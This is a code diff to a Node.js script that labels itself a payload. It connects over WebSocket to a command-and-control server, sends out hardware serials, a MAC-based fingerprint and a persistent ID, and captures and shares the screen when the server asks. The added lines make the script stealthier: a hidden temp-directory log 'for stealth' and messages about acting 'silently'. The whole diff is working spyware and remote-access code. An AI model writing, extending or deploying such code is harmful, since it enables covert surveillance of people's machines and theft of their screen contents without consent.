@@ -5,22 +5,28 @@ const os = require('os');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
+const { spawn } = require('child_process');
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
+const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log'); // Hidden log for stealth
 
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
 function log(msg) {
  const timestamp = new Date().toISOString();
- console.log(`[${timestamp}] ${msg}`);
- try { fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`); } catch(e) {}
+ const logLine = `[${timestamp}] ${msg}`;
+ console.log(logLine);
+ try { 
+   fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
+   fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
+ } catch(e) {}
 }
 
-log("[INIT] Payload starting...");
+log("[INIT] Payload starting silently...");
 
 // --- HARDWARE FINGERPRINT ---
 function getHardwareFingerprint() {
@@ -43,19 +49,29 @@ function getMacAddress() {
 }
 
 function getCpuSerial() {
- try { return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); }
- catch (e) {
- try { return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim(); }
- catch (e2) { return 'unknown_cpu'; }
- }
+ try { 
+   // Windows
+   return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); 
+ } catch (e) {
+ try { 
+   // Linux
+   return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim(); 
+ } catch (e2) { 
+   return 'unknown_cpu'; 
+ } }
 }
 
 function getBoardSerial() {
- try { return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); }
- catch (e) {
- try { return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim(); }
- catch (e2) { return 'unknown_board'; }
- }
+ try { 
+   // Windows
+   return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); 
+ } catch (e) {
+ try { 
+   // Linux
+   return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim(); 
+ } catch (e2) { 
+   return 'unknown_board'; 
+ } }
 }
 
 // --- ID MANAGEMENT ---
@@ -81,7 +97,7 @@ let isConnected = false;
 let myIp = 'Unknown';
 
 function initConnection() {
- log(`[WS] Attempting connection to ${WS_URL}...`);
+ log(`[WS] Attempting silent connection to ${WS_URL}...`);
 
  ws = new WebSocket(WS_URL);
 
@@ -93,6 +109,7 @@ function initConnection() {
  ws.on('open', () => {
  reconnectAttempts = 0;
  isConnected = true;
+ log(`[WS] Connected. Sending identity...`);
  // Send info including the unique ID, Serial Number AND Fingerprint
  safeSend(JSON.stringify({
  type: 'info',
@@ -169,7 +186,7 @@ async function captureScreenPureJS() {
 }
 
 function handleJoinRequest() {
- log("[JOIN] Request received. Starting screen share...");
+ log("[JOIN] Request received. Starting screen share silently...");
  captureScreenPureJS();
 }
 
